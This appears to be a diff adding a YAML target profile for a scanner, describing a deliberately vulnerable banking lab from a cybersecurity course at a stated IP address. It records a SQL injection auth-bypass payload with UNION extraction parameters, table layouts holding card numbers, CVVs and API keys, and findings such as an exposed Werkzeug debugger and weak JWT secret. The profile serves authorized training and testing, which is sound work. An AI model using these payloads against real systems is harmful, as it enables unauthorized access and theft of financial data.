@@ -1,0 +1,100 @@
+# MerdekaBank Lab — Merdeka Siber Batch 27
+# Source: Big Pickle scan writeup, 2026-07-10
+# Target: http://194.233.89.48:5000/
+
+name: "MerdekaBank (Flask/PostgreSQL Banking Lab)"
+description: >
+  Deliberately vulnerable banking application used in the Merdeka Siber
+  cybersecurity course. Flask (Python 3.9) + PostgreSQL 13.23 + Werkzeug
+  debugger enabled. SQLi in login endpoint allows full auth bypass and
+  UNION-based data extraction including plaintext credentials.
+source: "Merdeka Siber Batch 27 — Lab assignment target"
+
+fingerprints:
+  - response_contains: "MerdekaBank"
+  - response_contains: "Bank Digital"
+
+stack:
+  language: "Python"
+  framework: "Flask"
+  db: "postgresql"
+  db_version: "13.23"
+
+injections:
+  - id: "login_username_sqli"
+    endpoint: "/login"
+    method: "POST"
+    body_type: "json"
+    field: "username"
+    injection_type: "sqli"
+    sqli:
+      confirmed_techniques: ["error-based", "auth-bypass", "union"]
+      col_count: 10
+      reflected_col: 1
+      inject_prefix: "'"
+      db_type: "postgresql"
+      bypass_payload: "' OR 1=1-- -"
+      union_comment: "-- -"
+      # Table columns (id, username, password, account_number, balance,
+      #   is_admin, profile_picture, reset_pin, bio, is_suspended)
+    evidence: "POST /login {username: \"' OR 1=1-- -\"} → HTTP 200 with JWT token"
+
+endpoints:
+  - path: "/"
+    method: "GET"
+    auth_required: false
+  - path: "/login"
+    method: "POST"
+    auth_required: false
+    body_type: "json"
+    fields: ["username", "password"]
+  - path: "/register"
+    method: "POST"
+    auth_required: false
+    body_type: "json"
+  - path: "/transfer"
+    method: "POST"
+    auth_required: true
+    body_type: "json"
+    fields: ["to_account", "amount"]
+  - path: "/profile"
+    method: "GET"
+    auth_required: true
+
+tables:
+  - name: "users"
+    columns: [id, username, password, account_number, balance, is_admin,
+              profile_picture, reset_pin, bio, is_suspended]
+    note: "passwords stored as plaintext"
+  - name: "loans"
+  - name: "transactions"
+  - name: "virtual_cards"
+    columns: [card_number, cvv, expiry]
+  - name: "card_transactions"
+  - name: "merchants"
+    columns: [name, api_key, password]
+  - name: "merchant_payments"
+  - name: "bill_categories"
+  - name: "billers"
+  - name: "bill_payments"
+
+additional_findings:
+  - title: "Flask Debug Mode / Werkzeug Debugger Exposed"
+    severity: "high"
+    cwe: "CWE-94"
+    note: "Stack traces + SECRET key leaked on 500 errors"
+  - title: "Information Disclosure in login response"
+    severity: "high"
+    note: "debug_info field returns user_id, account_number, timing"
+  - title: "Plaintext Passwords"
+    severity: "critical"
+    cwe: "CWE-256"
+  - title: "Weak JWT Secret (HS256, no expiry)"
+    severity: "high"
+    cwe: "CWE-798"
+  - title: "No Rate Limiting on login"
+    severity: "medium"
+    cwe: "CWE-307"
+  - title: "Stored XSS in transaction descriptions"
+    severity: "medium"
+    cwe: "CWE-79"
